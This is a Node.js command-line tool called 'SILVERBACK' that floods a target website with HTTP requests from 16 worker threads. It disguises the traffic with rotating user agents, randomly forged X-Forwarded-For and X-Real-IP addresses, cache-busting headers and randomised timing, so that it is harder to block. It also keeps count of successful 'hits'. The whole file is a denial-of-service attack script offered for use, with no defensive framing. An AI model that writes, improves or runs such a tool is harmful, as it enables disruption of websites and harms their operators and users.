const axios = require('axios');
const fs = require('fs');
const { Worker, isMainThread, parentPort } = require('worker_threads');

// Load user-agents from a file for disguising
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

// Track statistics
let totalRequests = 0;
let successfulRequests = 0;
let failedRequests = 0;

// Clear terminal and print header at specific intervals
function logStats() {
  console.log('SILVERBACK');
  console.log('==========');
  console.log(`TOTAL - ${totalRequests}`);
  console.log(`HIT - ${successfulRequests}`);
  console.log(`KXX - ${failedRequests}`);
  console.log('=============================');
}

// Generate random User-Agent
function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Generate random IP to spoof the request (for X-Forwarded-For and X-Real-IP)
function generateRandomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

// Define valid routes
const validRoutes = [
  '/', '/index.html', '/favicon.ico', '/robots.txt', '/sitemap.xml', 
  '/about-us', '/contact-us', '/login', '/signup', '/blog'
];

// Random delay between requests (1 to 3 seconds)
function getRandomDelay() {
  return Math.random() * 2000 + 1000; // Random delay between 1-3 seconds
}

// Rotating headers for complete disguise
function getSpoofedHeaders(target) {
  return {
    'User-Agent': getRandomUserAgent(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Referer': target,
    'Origin': target,
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'X-Forwarded-For': generateRandomIP(), // Random spoofed IP
    'X-Real-IP': generateRandomIP(), // Another random spoofed IP
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Range': 'bytes=0-1000',
    'TE': 'Trailers',
    'If-None-Match': Math.random().toString(36).substring(7),
    'If-Modified-Since': new Date(Date.now() - Math.floor(Math.random() * 10000000000)).toUTCString()
  };
}

// Worker thread function to send requests
function workerFunction(target) {
  let count = 0;
  const route = validRoutes[Math.floor(Math.random() * validRoutes.length)];
  const url = `${target}${route}`;

  // Send requests in a loop (each worker handles a separate instance)
  setInterval(async () => {
    try {
      const response = await axios.get(url, {
        headers: getSpoofedHeaders(target),
        timeout: 15000, // Timeout for stealth mode (15 seconds)
        validateStatus: (status) => status >= 200 && status < 400, // Only accept valid status codes
      });
      
      // Successful request (status between 200-299)
      if (response.status >= 200 && response.status < 300) {
        successfulRequests++;
      } else if (response.status === 404) {
        // Skip 404 errors (don't count as failed)
        console.log(`[INFO] Skipped 404 on ${url}`);
      } else {
        failedRequests++;
      }

      totalRequests++;
      count++;
    } catch (error) {
      failedRequests++;
      totalRequests++;
      console.error(`[Worker] Error: ${error.message}`);
    }
  }, getRandomDelay());
}

// Main process that spawns worker threads
function startFlood(target, numThreads = 8) {
  if (isMainThread) {
    console.log(`Starting SILVERBACK flood with ${numThreads} threads...`);
    if (!target) {
      console.error('Usage: node silverback.js <target_url>');
      process.exit(1);
    }
    
    // Start logging every 10 seconds
    setInterval(logStats, 10000); // Log stats every 10 seconds

    // Pass the target URL to worker threads
    for (let i = 0; i < numThreads; i++) {
      const worker = new Worker(__filename);
      worker.postMessage(target); // Correctly pass the target URL to workers
    }
  } else {
    parentPort.on('message', (target) => {
      workerFunction(target);
    });
  }
}

// Execute the flood
const target = process.argv[2];
startFlood(target, 16); // Start with 16 threads to increase RPS
